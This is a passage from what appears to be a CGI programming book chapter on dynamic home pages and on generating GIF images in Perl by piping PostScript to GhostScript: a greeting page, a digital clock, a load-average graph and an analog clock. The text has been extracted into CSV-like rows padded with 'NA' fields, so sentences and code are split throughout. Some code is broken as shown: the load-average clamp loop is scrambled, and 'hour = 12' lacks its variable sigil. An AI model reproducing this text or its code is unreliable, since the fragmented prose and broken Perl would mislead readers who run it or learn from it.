"<!-- #echo var=""REMOTE_USER""-->",NA,NA
"If you make either of these two mistakes, the server will not give you an error; rather it will treat the ",NA,NA
whole expression as an HTML comment.,NA,NA
Tailoring SSI Output,NA,NA
Hypermedia Documents,NA,NA
6. Hypermedia Documents,NA,NA
Contents: ,NA,NA
Creating Dynamic Home Pages ,NA,NA
CGI Examples with PostScript,NA,NA
The ,NA,NA
gd,NA,NA
 Graphics Library,NA,NA
CGI Examples with gnuplot,NA,NA
CGI Examples with pgperl,NA,NA
Animation,NA,NA
"When you're looking around on the Web, going from site to site, you may have seen virtual ",NA,NA
"documents that greet you, pages with graphics that are created ""on the fly,"" or sizzling animations. ",NA,NA
These are all examples of graphic creation and manipulation using CGI. There are numerous tools and ,NA,NA
utilities that allow you to create documents such as these very quickly and easily.,NA,NA
6.1 Creating Dynamic Home Pages,NA,NA
What is a dynamic (or virtual) home page? It's a document that looks different when viewed at ,NA,NA
"different times or by different people. For example, you may want to display a random fortune cookie ",NA,NA
"when someone visits your home page. If you conduct business on the Web, you might want to use a ",NA,NA
dynamic document to advertise different products when someone accesses the document.,NA,NA
"In order to set up a virtual home page, you have to modify certain configuration settings to ask the ",NA,NA
"server to execute a CGI program instead of displaying a static HTML file. Normally, the NCSA server ",NA,NA
looks for the file ,NA,NA
index.html,NA,NA
 in the document root directory and displays it.,NA,NA
The following line when added to the server resource configuration file (,NA,NA
srm.conf,NA,NA
) forces the server to ,NA,NA
execute the CGI program ,NA,NA
index.html,NA,NA
 (a Perl program doesn't have to end with a ,NA,NA
.pl,NA,NA
 extension):,NA,NA
AddType application/x-httpd-cgi index.html,NA,NA
The ,NA,NA
AddType,NA,NA
" server directive was originally introduced in Chapter 1, The Common Gateway ",NA,NA
Interface. It allows you to execute CGI programs located outside the ,NA,NA
cgi-bin,NA,NA
 directory.,NA,NA
"Under the CERN server, you can do something similar by adding the following line to httpd.conf:",NA,NA
Exec /index.html /usr/local/etc/httpd/cgi-bin/index.pl,NA,NA
"Now, let's create a simple virtual home page that displays a greeting, based on the time of the access, ",NA,NA
"and a message indicating whether the webmaster is currently logged in. Of course, this is a very ",NA,NA
simple example that illustrates the creation of a home page with dynamic information. You can also ,NA,NA
"create a virtual home page using Server Side Includes, as shown in ",NA,NA
"Chapter 5, ",NA,NA
Server Side Includes,NA,NA
.,NA,NA
#!/usr/local/bin/perl,NA,NA
"print ""Content-type: text/html"", ""\n\n"";",NA,NA
"$webmaster = ""shishir"";",NA,NA
"($seconds, $minutes, $hour) = localtime (time);",NA,NA
The ,NA,NA
localtime,NA,NA
 function takes the current time (in seconds since 1970) and returns a nine-element array ,NA,NA
consisting of the date and time for the current time zone. We will be using only the first three ,NA,NA
"elements of the array, which contain the seconds, minutes, and hour values (in the military 24-hour ",NA,NA
format).,NA,NA
"If your system's time zone is not configured properly, you will get the date and time for the ",NA,NA
"Greenwich time zone (GMT). In such a case, you will need to use the TZ environment variable to set ",NA,NA
the proper time zone before you call the ,NA,NA
localtime,NA,NA
 function:,NA,NA
$ENV{'TZ'} = 'EST';,NA,NA
This sets your time zone to Eastern Standard Time (EST). You can see some of the other time zones ,NA,NA
by looking at the following document: ,NA,NA
http://wwwcrasys.anu.edu.au/reference/world.timezones.html,NA,NA
To return to the program:,NA,NA
if ( ($hour >= 23) || ($hour <= 6) ) {,NA,NA
" $greeting = ""Wow, you are up late"";",NA,NA
} elsif ( ($hour > 6) && ($hour < 12) ) {,NA,NA
" $greeting = ""Good Morning"";",NA,NA
} elsif ( ($hour >= 12) && ($hour <= 18) ) {,NA,NA
" $greeting = ""Good Afternoon"";",NA,NA
} else {,NA,NA
" $greeting = ""Good Evening"";",NA,NA
},NA,NA
Since the ,NA,NA
localtime,NA,NA
" function returns the hour in a 24-hour format, we can use this to our advantage. It ",NA,NA
is much easier to select a greeting based on this format because the time scale is continuous from 0-,NA,NA
"23, and we don't have to worry about determining whether an hour value of ""12"" indicates 12:00 ",NA,NA
A.M. or 12:00 P.M.,NA,NA
if ($hour > 12) {,NA,NA
 $hour -= 12;,NA,NA
} elsif ($hour == 0) {,NA,NA
 hour = 12;,NA,NA
},NA,NA
"$time = sprintf (""%02d:%02d:%02d"", $hour, $minutes, $seconds);",NA,NA
"For display purposes, however, the hour is converted into the regular 12-hour format. The ",NA,NA
sprintf ,NA,NA
"function formats a string according to the field specifiers. In this case, we want the hours, minutes,",NA,NA
"and seconds to be two digits in length, so a minute value of ""9"" will be displayed as ""09"". The ",NA,NA
formatted string is stored in the ,NA,NA
$time,NA,NA
 variable.,NA,NA
"open(CHECK, ""/usr/bin/w -h -s $webmaster |"");",NA,NA
if (<CHECK> =~ /$webmaster/) {,NA,NA
" $in_out = ""I am currently logged in."";",NA,NA
} else {,NA,NA
" $in_out = ""I just stepped out."";",NA,NA
},NA,NA
This ,NA,NA
open,NA,NA
" command might look strange to you if you're new to Perl. Instead of opening a file, it opens ",NA,NA
"a pipe for input. In other words, Perl executes the UNIX program ",NA,NA
/usr/bin/w,NA,NA
 and redirects its output to ,NA,NA
the file handle ,NA,NA
CHECK,NA,NA
". As you'll see throughout the book, this technique allows us to communicate ",NA,NA
with other utilities and programs by sending and receiving data through a pipe.,NA,NA
We pass the value stored in ,NA,NA
$webmaster,NA,NA
 as the argument to ,NA,NA
/usr/bin/w,NA,NA
", which returns all of the system ",NA,NA
"processes ""owned"" by",NA,NA
 $webmaster,NA,NA
. We don't really need to know much about the processes. The only ,NA,NA
thing we're concerned about is whether any processes for ,NA,NA
$webmaster,NA,NA
" exist, indicating that he/she is ",NA,NA
"logged in. Depending on this, the ",NA,NA
$in_out,NA,NA
 variable is set to a specific message.,NA,NA
 close (CHECK);,NA,NA
"Once we're done, we close the file handle. It's a good practice to clean up all resources when you're ",NA,NA
"done with them. Now, we're ready to output the information that we've gathered so far.",NA,NA
Instead of using a ,NA,NA
print,NA,NA
" statement to send each line to standard output, we'll use a ""here"" document. ",NA,NA
"What is that, you may ask? See for yourself:",NA,NA
print <<End_of_Homepage;,NA,NA
This statement outputs everything below it to standard output until it reaches the string ,NA,NA
"""End_of_Homepage."" This saves us from typing ",NA,NA
print,NA,NA
 before each line that we want to output.,NA,NA
Since we output a MIME content type of ,NA,NA
text/html,NA,NA
", we need to output some HTML information:",NA,NA
<HTML>,NA,NA
<HEAD><TITLE>Welcome to my home page</TITLE></HEAD>,NA,NA
<BODY>,NA,NA
$greeting! It is $time. Here are some of my favorite links:,NA,NA
.,NA,NA
. (some information),NA,NA
.,NA,NA
<ADDRESS>,NA,NA
Shishir Gundavaram ($in_out),NA,NA
</ADDRESS>,NA,NA
</BODY></HTML>,NA,NA
End_of_Homepage,NA,NA
exit(0);,NA,NA
"The whole point of this exercise is that you can ""embed"" another language (like HTML) into a CGI",NA,NA
script. But the variables from the enclosing script can be used within the HTML--Perl substitutes the ,NA,NA
right value for each variable. That's what makes this page dynamic rather than static. An important ,NA,NA
"thing to note about ""here"" documents is that they follow the same conventions as the regular ",NA,NA
print ,NA,NA
"statement, in that Perl will evaluate only variables, and not function calls and other expressions.",NA,NA
"In this program, we output a MIME content type of ",NA,NA
text/html,NA,NA
 and followed that with the HTML code. ,NA,NA
But we're not limited to just creating dynamic HTML documents; we can create dynamic graphics as ,NA,NA
"well, as we'll see next.",NA,NA
Common Errors,NA,NA
CGI Examples with,NA,NA
PostScript,NA,NA
6.2 CGI Examples with PostScript,NA,NA
"PostScript is a language for laying out nicely designed pages with all kinds of fonts, pictures, and other things that ",NA,NA
HTML is not capable of displaying. PostScript on the screen often looks exactly like a page from a book or ,NA,NA
"journal. The language is device independent, so it can be printed or displayed on any device that interprets it. Since ",NA,NA
"most Web browsers don't handle PostScript code, it has to be run through an interpreter to produce an image that ",NA,NA
browsers can handle. Let's look at some examples that illustrate this concept.,NA,NA
Digital Clock,NA,NA
"In this example, we'll write PostScript code to create a virtual image of a digital clock displaying the current time. ",NA,NA
"Since Web browsers can't display PostScript graphics, we will run this code through a PostScript interpreter, GNU ",NA,NA
"GhostScript (freely available for many platforms), to create a GIF image which the browsers can easily handle. ",NA,NA
You should be conservative when creating dynamic graphics in this manner because GhostScript uses up a lot of ,NA,NA
"system resources. If used wisely, however, these dynamic images can add a lot to your documents.",NA,NA
You can get GhostScript from the following location: ,NA,NA
http://www.phys.ufl.edu/,NA,NA
docs/goodies/unix/previewers/ghostscript.html.,NA,NA
"Let's take a step-by-step look at this Perl script, which creates an image of a digital clock where the letters are red ",NA,NA
(Times Roman 14 point font) and the background is black.,NA,NA
#!/usr/local/bin/perl,NA,NA
"$GS = ""/usr/local/bin/gs"";",NA,NA
$| = 1;,NA,NA
"print ""Content-type: image/gif"", ""\n\n"";",NA,NA
The first line of code just sets the ,NA,NA
$GS,NA,NA
 variable to the path name of the GhostScript executable. You might need to ,NA,NA
"change this to reflect the correct path on your system. Next, the ",NA,NA
$|,NA,NA
" variable is set to 1, a Perl convention that makes ",NA,NA
"the standard output unbuffered. Whenever you're outputting any type of graphics, it's better to unbuffer standard ",NA,NA
"output, so Perl flushes the buffer after every ",NA,NA
print,NA,NA
" statement. Unfortunately, this degrades performance slightly ",NA,NA
because the buffer has to be flushed after ,NA,NA
every,NA,NA
 write. But it prevents occasional problems where the image data ,NA,NA
gets lost or corrupted.,NA,NA
"And since we're creating a virtual GIF image, we need to output a MIME content type of ",NA,NA
image/gif,NA,NA
.,NA,NA
"($seconds, $minutes, $hour) = localtime (time);",NA,NA
if ($hour > 12) {,NA,NA
 $hour -= 12;,NA,NA
" $ampm = ""pm"";",NA,NA
} else {,NA,NA
" $ampm = ""am""; ",NA,NA
},NA,NA
if ($hour == 0) {,NA,NA
 $hour = 12;,NA,NA
},NA,NA
"$time = sprintf (""%02d:%02d:%02d %s"", $hour, $minutes, $seconds, $ampm);",NA,NA
"This code stores the current time as well as an ""A.M."" or ""P.M."" in the ",NA,NA
$time,NA,NA
 variable.,NA,NA
$x = 80;,NA,NA
$y = 15;,NA,NA
"We set the image dimensions to 80x15 pixels. Horizontally, 80 pixels are enough to display our time string. And ",NA,NA
"vertically, 15 pixels are sufficient to show a 14-point font.",NA,NA
"open (GS, ""|$GS -sDEVICE=gif8 -sOutputFile=- -q -g${x}x${y} - 2> /dev/null"");",NA,NA
We use ,NA,NA
open,NA,NA
" to create a pipe (indicated by the ""|"" character) for output. This is the opposite of what we did in the ",NA,NA
previous example. Whatever data is written to the GS file handle is sent directly to GhostScript for execution (or ,NA,NA
interpretation); there is no need to store information in temporary files.,NA,NA
Several command-line options are used to GhostScript. The most important one is ,NA,NA
"sDEVICE,",NA,NA
 which specifies the ,NA,NA
"driver that GhostScript will use to create the output. Since we want a GIF image, we'll use the ",NA,NA
gif8,NA,NA
" driver, which is ",NA,NA
packaged with the default GhostScript installation kit. (Warning: Some system administrators don't install all the ,NA,NA
"default drivers, in which case the following program may not work.)",NA,NA
The ,NA,NA
-sOutputFile,NA,NA
" option with a value of ""-"" indicates that the output image data is to be written to standard output.",NA,NA
The ,NA,NA
-q,NA,NA
 option turns off any informational messages output by GhostScript to standard output. This is very ,NA,NA
"important because the text messages can corrupt the graphic data, as both are normally written to standard output ",NA,NA
stream. The ,NA,NA
-g,NA,NA
 option sets the dimensions for the output image.,NA,NA
"The ""-"" instructs GhostScript to read PostScript data from standard input, because that's where our script is writing ",NA,NA
"the PostScript code to. Finally, any error messages from GhostScript are discarded by redirecting the standard error ",NA,NA
"to a null device, using the shell syntax ",NA,NA
2>/dev/null,NA,NA
.,NA,NA
print GS <<End_of_PostScript_Code;,NA,NA
This ,NA,NA
print,NA,NA
 statement will write the PostScript code below to the file handle GS until it encounters the ,NA,NA
"""End_of_PostScript_Code"" string (another example of a ""here"" document).",NA,NA
%!PS-Adobe-3.0 EPSF-3.0,NA,NA
%%BoundingBox: 0 0 $x $y,NA,NA
%%EndComments,NA,NA
"This is the start of the PostScript code. The first line, starting with ",NA,NA
%!PS-Adobe-3.0,NA,NA
", is very important (it is much ",NA,NA
like the #! line used at the beginning of Perl scripts). It instructs GhostScript that the input consists of Encapsulated ,NA,NA
PostScript (EPS) commands. EPS was designed to allow various programs to share and manipulate a single ,NA,NA
PostScript graphic.,NA,NA
"Since EPS was created to share graphic images, the",NA,NA
 BoundingBox,NA,NA
 statement in the second line specifies the ,NA,NA
"position and size of the image that will be shared; in this case, the entire image. The ",NA,NA
EndComments,NA,NA
 statement ends ,NA,NA
the header section for the PostScript program.,NA,NA
"Before we start examining the main part of our program, let's discuss how PostScript works. PostScript is different ",NA,NA
from many other programming languages in that it's stack based. What does that mean? If a command needs two ,NA,NA
"arguments, these arguments must be placed ""on the stack"" before the command is executed. For example, if you ",NA,NA
"want to add two numbers, say 5 and 7, you must place them on the stack first, and then invoke the ",NA,NA
add,NA,NA
 operator.,NA,NA
The ,NA,NA
add,NA,NA
 operator adds the two numbers and places the result back on the stack. Here's the main part of the ,NA,NA
program:,NA,NA
/Times-Roman findfont 14 scalefont setfont,NA,NA
The operand ,NA,NA
Times-Roman,NA,NA
 is first placed on the stack since the ,NA,NA
findfont,NA,NA
 operator expects one argument. The ,NA,NA
scalefont,NA,NA
" operator also needs one argument (14), and ",NA,NA
setfont,NA,NA
" needs two--the font name and the size, which ",NA,NA
are returned by the ,NA,NA
findfont,NA,NA
 and ,NA,NA
scalefont,NA,NA
 operators.,NA,NA
/red   {1 0 0 setrgbcolor} def,NA,NA
/black {0 0 0 setrgbcolor} def,NA,NA
We proceed to define the two colors that we'll use in the image: red and black. The ,NA,NA
setrgbcolor,NA,NA
 operator needs ,NA,NA
"three operands on the stack: the red, blue, and green indexes (ranging from 0--1) that comprise the color. Red is ",NA,NA
"obtained by setting the red index to the maximum, and leaving the blue and green indices at zero. Black is obtained ",NA,NA
by setting all three indices to zero.,NA,NA
black clippath fill,NA,NA
0 0 moveto,NA,NA
($time) red show,NA,NA
We use the ,NA,NA
fill,NA,NA
" command to fill the clipping region (which represents the entire drawing area) black, in essence ",NA,NA
creating a black background. The ,NA,NA
moveto,NA,NA
" command moves the ""cursor"" to the origin, which is the lower-left corner ",NA,NA
in PostScript. The ,NA,NA
show,NA,NA
 operator displays the string stored in the Perl variable ,NA,NA
$time,NA,NA
 in red.,NA,NA
showpage,NA,NA
Every PostScript program must contain the ,NA,NA
showpage,NA,NA
" operator, somewhere near the end. PostScript will not output ",NA,NA
the image until it sees this operator.,NA,NA
End_of_PostScript_Code,NA,NA
close (GS); ,NA,NA
exit(0);,NA,NA
"The ""End_of_PostScript_Code"" string ends the ",NA,NA
print,NA,NA
" statement. The GS file handle is closed, and the program exits ",NA,NA
with a success status (zero).,NA,NA
Figure 6.1,NA,NA
 shows how the output of this program will be rendered on a Web browser.,NA,NA
Figure 6.1: PostScript digital clock,"[Graphic: 
  
 Figure 6-1]",NA
"Now, how do you go about accessing this program? There are two ways. The first is to open the URL to this CGI ",NA,NA
program:,NA,NA
http://your.machine/cgi-bin/digital.pl,NA,NA
"Or, you can embed this image in another HTML document (either static or dynamic), like so:",NA,NA
"<IMG SRC=""/cgi-bin/digital.pl"">",NA,NA
"This second method is very useful as you can include virtual graphics in a static or dynamic HTML document, as ",NA,NA
you will see in the following section.,NA,NA
Inserting Multiple Dynamic Images,NA,NA
All of the programs we've discussed up to this point returned only one MIME content type. What if you want to ,NA,NA
"create a dynamic HTML document with embedded virtual graphics, animations, and sound. Unfortunately, as of ",NA,NA
"this writing, a CGI program cannot accomplish this task.",NA,NA
The closest we can get to having multiple heterogeneous information in a ,NA,NA
single,NA,NA
 document is embedding virtual ,NA,NA
images in a dynamic HTML document. Here is a simple example:,NA,NA
#!/usr/local/bin/perl ,NA,NA
"$digital_clock = ""/cgi-bin/digital.pl""; ",NA,NA
"print ""Content-type: text/html"", ""\n\n""; ",NA,NA
print <<End_of_HTML; ,NA,NA
.,NA,NA
. (some HTML code) ,NA,NA
.,NA,NA
"<IMG SRC=""$digital_clock""> ",NA,NA
.,NA,NA
. (some more HTML code) ,NA,NA
.,NA,NA
End_of_HTML ,NA,NA
exit(0);,NA,NA
"When the server executes this CGI program, it returns a dynamic HTML document that consists of the virtual ",NA,NA
"image created by the digital clock program discussed earlier. In other words, the server will execute the digital ",NA,NA
"clock program, and place the output from it into the HTML document.",NA,NA
"To reiterate, this technique works only when you are sending a combination of HTML and graphics. If you want to ",NA,NA
"send other data formats concurrently, you'll have to wait until browsers support a special MIME content type that ",NA,NA
allows you to send more than one data format.,NA,NA
Another Example: System Load Average,NA,NA
The digital clock example presented earlier in the chapter is a very simple example and doesn't use the full power ,NA,NA
"of PostScript. Now, we'll look at an example that uses some of PostScript's powerful drawing operators to create a ",NA,NA
graph of the system load average:,NA,NA
#!/usr/local/bin/perl ,NA,NA
"$GS = ""/usr/local/bin/gs""; ",NA,NA
$| = 1; ,NA,NA
"print ""Content-type: image/gif"", ""\n\n""; ",NA,NA
$uptime = `/usr/ucb/uptime`; ,NA,NA
($load_averages) = ($uptime =~ /average: (.*)$/); ,NA,NA
"@loads[0..2] = split(/,\s/, $load_averages);",NA,NA
"In Perl, the ""backtics"" (`) allow you to execute a UNIX system command and store its output. In this case, we are ",NA,NA
storing the output from the ,NA,NA
uptime,NA,NA
 command into the variable ,NA,NA
$uptime,NA,NA
. The ,NA,NA
uptime,NA,NA
 command returns (among other ,NA,NA
"things) three values representing the load average of the system in the last 5, 10, and 15 minutes (though this may ",NA,NA
differ among the various UNIX implementations).,NA,NA
I grab the output of ,NA,NA
uptime,NA,NA
", strip it down to the load averages, and place the load averages into an array. Here is the ",NA,NA
output of a typical ,NA,NA
uptime,NA,NA
 command:,NA,NA
" 12:26AM  up 1 day,  17:35,  40 users,  load average: 3.55, 3.67, 3.53",NA,NA
"A regular expression is used to retrieve data following the word ""average:"" up until the end of the line. This string, ",NA,NA
"which contains the load averages separated by a comma and a space, is stored in the variable ",NA,NA
$load_averages,NA,NA
. The ,NA,NA
split,NA,NA
 operator splits (or separates) the data string on the comma and the space into three values that are stored in the ,NA,NA
array ,NA,NA
@loads,NA,NA
.,NA,NA
for ($loop=0; $loop <= 2; $loop++) {,NA,NA
 if ($loads[$loop] > 10) {,NA,NA
},NA,NA
 },NA,NA
 $loads[$loop] = 10;,NA,NA
This loop iterates through the ,NA,NA
@loads,NA,NA
 array and reduces any load average over 10 to exactly 10. This makes it very ,NA,NA
"easy for us to draw the graph. Otherwise, we need to calculate scaling coefficients and scale the graph accordingly.",NA,NA
$x = $y = 175; ,NA,NA
"open (GS, ""|$GS -sDEVICE=gif8 -sOutputFile=- -q -g${x}x${y} - 2> /dev/null"");",NA,NA
Through the ,NA,NA
$x,NA,NA
 and ,NA,NA
$y,NA,NA
" variables, the dimensions of the image are set to 175x175.",NA,NA
print GS <<End_of_PostScript_Code; ,NA,NA
%!PS-Adobe-3.0 EPSF-3.0 ,NA,NA
%%BoundingBox: 0 0 $x $y ,NA,NA
%%EndComments ,NA,NA
/black  {0 0 0 setrgbcolor} def ,NA,NA
/red    {1 0 0 setrgbcolor} def ,NA,NA
/blue   {0 0 1 setrgbcolor} def ,NA,NA
/origin {0 dup} def,NA,NA
We use the ,NA,NA
setrgb,NA,NA
" operator to set the three colors (black, red, and blue) that we need to draw our image. The ",NA,NA
variable ,NA,NA
origin,NA,NA
 contains two zero values; the ,NA,NA
dup,NA,NA
" operator duplicates the top item on the stack. Note, the origin in ",NA,NA
PostScript is defined to be the lower-left corner of the image.,NA,NA
15 150 moveto ,NA,NA
/Times-Roman findfont 16 scalefont setfont ,NA,NA
(System Load Average) blue show,NA,NA
The ,NA,NA
moveto,NA,NA
" operator moves the ""cursor"" to point (15, 150). We use a blue Times-Roman 16 point for our title. The ",NA,NA
show,NA,NA
 operator displays the text.,NA,NA
30 30 translate,NA,NA
translate,NA,NA
" is a very powerful operator. It moves (or translates, in mathematical terms) the coordinate axes from (0,0) ",NA,NA
"to the point (30, 30). From here on, when we refer to point (0, 0), it will actually be point (30, 30) in the image. I ",NA,NA
did this translation to make the mathematics of drawing a figure easier.,NA,NA
1 setlinewidth ,NA,NA
origin moveto 105 0 rlineto black stroke ,NA,NA
origin moveto 0 105 rlineto black stroke,NA,NA
Now we start to draw a figure showing the load average. We set the line width to be one pixel for all drawing ,NA,NA
operations. The ,NA,NA
rlineto,NA,NA
" operator draws two invisible lines from the origin--actually the point (30,30)--to the ",NA,NA
"specified points. These lines are ""painted"" with the ",NA,NA
stroke,NA,NA
" operator. Since we are drawing a graph, these two lines ",NA,NA
represent the x and y axes in the graph.,NA,NA
"Since a normal line extends from one point to the other, two coordinates are required to draw a line. But, in this ",NA,NA
"case, we use the ",NA,NA
rlineto,NA,NA
 operator to specify coordinates relative to the current point (the origin).,NA,NA
origin moveto ,NA,NA
0 1 10 {,NA,NA
 10 mul 5 neg exch moveto,NA,NA
 10 0 rlineto blue stroke ,NA,NA
} for,NA,NA
The loop shown above draws ten tick marks on the y axis. The ,NA,NA
for,NA,NA
" loop works the same as in any other language, ",NA,NA
with one minor exception. The loop variable (or counter) is placed on the top of the stack each time through the ,NA,NA
"loop. In this case, the loop variable is multiplied by 10 on each iteration through the loop and placed on the stack.",NA,NA
"Then, a value of negative five is also placed on the stack. The two values on the stack (-5 and the counter ",NA,NA
"multiplied by 10) represent the coordinates where a tick has to be drawn, and are swapped with the ",NA,NA
exch,NA,NA
 operator. ,NA,NA
"From those coordinates, we draw a blue horizontal line that is 10 pixels in length.",NA,NA
"To summarize, here is a step-by-step breakdown of the code we've just discussed:",G,NA
Move to the coordinates stored in the ,NA,NA
origin,NA,NA
 variable,G,NA
Execute the for loop 11 times (from 0 to 10 in increments of 1),G,NA
"Move to coordinates (-5, 10 x loop value)","G 
  
 G",NA
"Draw a blue line from the above coordinates (-5, 10 x loop value) to (5, 10 x loop value) for a length of 10 ",NA,NA
pixels in the horizontal direction and repeat,NA,NA
End of loop,NA,NA
"Now, let's continue with the program.",NA,NA
origin moveto ,NA,NA
0 1 4 {,NA,NA
 25 mul 5 neg moveto,NA,NA
 0 10 rlineto blue stroke,NA,NA
} for,NA,NA
"This procedure is nearly the same as the one discussed above, except that we are drawing vertical ticks on the x ",NA,NA
"axis, where each tick mark is separated by 25 pixels (instead of 10), and is 10 pixels in length.",NA,NA
"The code below draws five points: the origin, the three load average points, and a point on the x axis itself to ",NA,NA
"""complete"" the figure. Then we connect these points to create a filled region that represents the load average over ",NA,NA
time.,NA,NA
newpath,NA,NA
origin moveto,NA,NA
25 $loads[0] 10 mul lineto ,NA,NA
50 $loads[1] 10 mul lineto ,NA,NA
75 $loads[2] 10 mul lineto ,NA,NA
The ,NA,NA
newpath,NA,NA
 operator establishes a new path. A path is used to create closed figures that can then be filled easily ,NA,NA
with the ,NA,NA
fill,NA,NA
" operator. Initially, we use the ",NA,NA
moveto,NA,NA
 operator to move to the origin. The load average is scaled by 10 ,NA,NA
"and then used as the y coordinate. The x coordinate is simply incremented in steps of twenty--five-remember, each ",NA,NA
"tick is separated by 25 pixels. Then, we draw a line using these two values. This procedure is repeated for all three ",NA,NA
load average values.,NA,NA
100 0 lineto ,NA,NA
closepath,NA,NA
red fill,NA,NA
showpage,NA,NA
End_of_PostScript_Code,NA,NA
"A line is drawn from the last load average coordinate to the point directly on the x axis (100, 0). Finally, to close ",NA,NA
"the figure, we draw a line from (100, 0) to the starting point of the path and fill it with red.",NA,NA
close (GS);,NA,NA
exit(0);,NA,NA
This ends the PostScript section of our script. Back to Perl. The load average graph will look similar to the graph,NA,NA
shown in ,NA,NA
Figure 6.2,NA,NA
.,NA,NA
Figure 6.2: Graph of load average,"[Graphic: 
  
 Figure 6-2]",NA
"Although it's possible to create graphs in PostScript (as we've just seen), it's much easier and quicker to use other ",NA,NA
utilities that were developed for the sole purpose of graphing numerical data. Several such utilities along with ,NA,NA
examples will be discussed later in this chapter.,NA,NA
Final PostScript Example: Analog Clock,NA,NA
The final PostScript example we'll look at creates an analog clock using some of the more powerful PostScript ,NA,NA
operators. The image created by this program looks much like the one produced by the X Window System program ,NA,NA
xclock,NA,NA
.,NA,NA
#!/usr/local/bin/perl ,NA,NA
"$GS = ""/usr/local/bin/gs"";",NA,NA
$| = 1;,NA,NA
"print ""Content-type: image/gif"", ""\n\n"";",NA,NA
"($seconds, $minutes, $hour) = localtime (time);",NA,NA
$x = $y = 150; ,NA,NA
"open (GS, ""|$GS -sDEVICE=gif8 -sOutputFile=- -q -g${x}x${y} - 2> /dev/null"");",NA,NA
print GS <<End_of_PostScript_Code;,NA,NA
%!PS-Adobe-3.0 EPSF-3.0,NA,NA
%%BoundingBox: 0 0 $x $y ,NA,NA
%%EndComments,NA,NA
"This initialization code is nearly the same in all of our PostScript examples so far, and should be familiar to you.",NA,NA
/max_length     $x def ,NA,NA
/line_size      1.5 def ,NA,NA
/marker         5 def,NA,NA
We start out by defining a lot of variables that are based on the values stored in the ,NA,NA
$x,NA,NA
 and ,NA,NA
$y,NA,NA
 variables. We do this ,NA,NA
"so that if you increase the dimensions of the clock, all the objects of the clock (e.g., the minute and second hands) ",NA,NA
are scaled correctly. An important thing to note is that the x and y dimensions have to be equal for this automatic ,NA,NA
scaling to work properly.,NA,NA
The ,NA,NA
max_length,NA,NA
" variable sets the maximum length (or height, since this is a square clock) of the frame around the ",NA,NA
"clock. The line width, used to draw the various objects, is stored in the ",NA,NA
line_size,NA,NA
 variable. The marker represents ,NA,NA
the length of the ticks (or markers) that represent the twelve hours on the clock.,NA,NA
/origin         {0 dup} def,NA,NA
/center         {max_length 2 div} def,NA,NA
/radius         center def,NA,NA
/hour_segment    {0.50 radius mul} def,NA,NA
/minute_segment  {0.80 radius mul} def,NA,NA
"The origin contains the point (0, 0). Notice that whenever a variable declaration contains PostScript operators, we ",NA,NA
"need to enclose the expression in braces. The center x (or y) coordinate of the clock (75, in this case) is stored in ",NA,NA
center,NA,NA
". The radius of the circle that will encompass the entire drawing area is also 75, and is appropriately stored in ",NA,NA
the ,NA,NA
radius,NA,NA
 variable. The ,NA,NA
hour_segment ,NA,NA
"contains the length of the line that will represent the hour value, which is ",NA,NA
half (or 50%) of the radius. The ,NA,NA
minute_segment,NA,NA
" contains the length of the minute hand, which is 80% of the ",NA,NA
radius. These are arbitrary values that make the clock look attractive.,NA,NA
/red            {1 0 0 setrgbcolor} ,NA,NA
def /green          {0 1 0 ,NA,NA
setrgbcolor} def /blue           {0 0 ,NA,NA
1 setrgbcolor} def /black          {0 ,NA,NA
0 0 setrgbcolor} def,NA,NA
"We proceed to define four variables to hold the color values for red, green, blue, and black.",NA,NA
/hour_angle {,NA,NA
 $hour $minutes 60 div add 3 sub 30 mul,NA,NA
 neg ,NA,NA
} def ,NA,NA
/minute_angle {,NA,NA
 $minutes $seconds 60 div add 15 sub 6 mul,NA,NA
 neg ,NA,NA
} def,NA,NA
The angle of the hour and minute hands is calculated by the following formulas:,NA,NA
hour angle = ((minutes / 60) + hour - 3) * 30 ,NA,NA
minute angle = ((seconds / 60) + minutes - 15) * 6,NA,NA
"Try to understand these formulas. The derivation is pretty trivial if you know your trigonometry! Now, let's get to ",NA,NA
the real drawing routines.,NA,NA
center dup translate ,NA,NA
black clippath fill ,NA,NA
line_size setlinewidth ,NA,NA
origin radius 0 360 arc blue stroke,NA,NA
We use the ,NA,NA
translate,NA,NA
 operator to move the origin to the coordinate values stored in the variable center (in this case ,NA,NA
"75, 75). The ",NA,NA
fill,NA,NA
 operator fills the entire drawing area black. The ,NA,NA
setlinewidth,NA,NA
 operator sets the default line width for ,NA,NA
"all drawing operations to 1.5 pixels. To finish the outline of the clock, we draw a blue circle. In PostScript ",NA,NA
"terminology, we draw an arc from 0 to 360 degrees with the center at the ",NA,NA
origin,NA,NA
 and a radius of 75.,NA,NA
gsave ,NA,NA
1 1 12 {,NA,NA
 pop,NA,NA
 radius marker sub 0 moveto ,NA,NA
 marker 0 rlineto red stroke,NA,NA
 30 rotate ,NA,NA
} for ,NA,NA
grestore,NA,NA
Here is where the code gets a little complicated. We will discuss the ,NA,NA
gsave,NA,NA
 and ,NA,NA
grestore,NA,NA
 operators in a moment. ,NA,NA
Let's first look at the ,NA,NA
for,NA,NA
" loop, which draws the marks representing the 12 hours. Here is how it does it:",G,NA
Execute the for loop 12 times (from 1 to 12 in increments of 1),G,NA
Remove the top value on the stack (or the loop counter) because we have no use for it!,G,NA
"Move to the coordinate (radius - marker, 0)",G,NA
"Draw a red line from (radius - marker, 0) to (marker, 0)",G,NA
Rotate the x and y axes by 30 degrees and repeat,G,NA
End of loop,NA,NA
"The most important aspect of this loop is the rotation of the x and y axes, accomplished by the ",NA,NA
rotate,NA,NA
 command. ,NA,NA
"This is one of the more powerful features of PostScript! By rotating the axes, all we have to do is draw straight",NA,NA
"lines, instead of calculating the coordinates for various angles. The ",NA,NA
gsave,NA,NA
 and ,NA,NA
grestore,NA,NA
 operators keep the rest of ,NA,NA
the drawing surface intact while the axes are being moved.,NA,NA
origin moveto ,NA,NA
hour_segment hour_angle cos mul ,NA,NA
hour_segment hour_angle sin mul ,NA,NA
lineto green stroke ,NA,NA
origin moveto ,NA,NA
minute_segment minute_angle cos mul ,NA,NA
minute_segment minute_angle sin mul ,NA,NA
lineto green stroke ,NA,NA
origin line_size 2 mul 0 360 arc red fill ,NA,NA
showpage ,NA,NA
End_of_PostScript_Code ,NA,NA
close (GS); ,NA,NA
exit(0);,NA,NA
"These statements are responsible for drawing the actual minute and second hands, as well as a small circle in the ",NA,NA
middle of the clock. The mathematical formulas to determine the hour angle are:,NA,NA
hour (x coordinate) = cos (hour angle) * hour segment ,NA,NA
hour (y coordinate) = sin (hour angle) * hour segment,NA,NA
The same theory is applied in calculating the angle for the second hand. ,NA,NA
Figure 6.3,NA,NA
 shows how the analog clock ,NA,NA
will be rendered by a Web browser.,NA,NA
